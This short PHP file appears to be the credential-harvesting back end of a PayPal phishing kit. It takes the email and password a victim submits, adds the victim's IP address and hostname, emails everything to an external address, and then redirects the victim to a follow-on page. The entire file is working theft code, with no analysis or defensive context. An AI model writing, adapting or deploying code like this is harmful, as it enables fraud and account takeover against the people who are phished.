<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------|paypal|--------------|\n";
$message .= "|Email    : ".$_POST['email']."\n";
$message .= "|Password : ".$_POST['pass']."\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------|paypal|--------------|\n";
$send = "spamiarskie@wp.pl";
$subject = "~ ResuLtaT PpL ~ | $ip";
{
mail("spamiarskie@wp.pl", "$subject", $message);   
}
header("Location:../info.html");
?>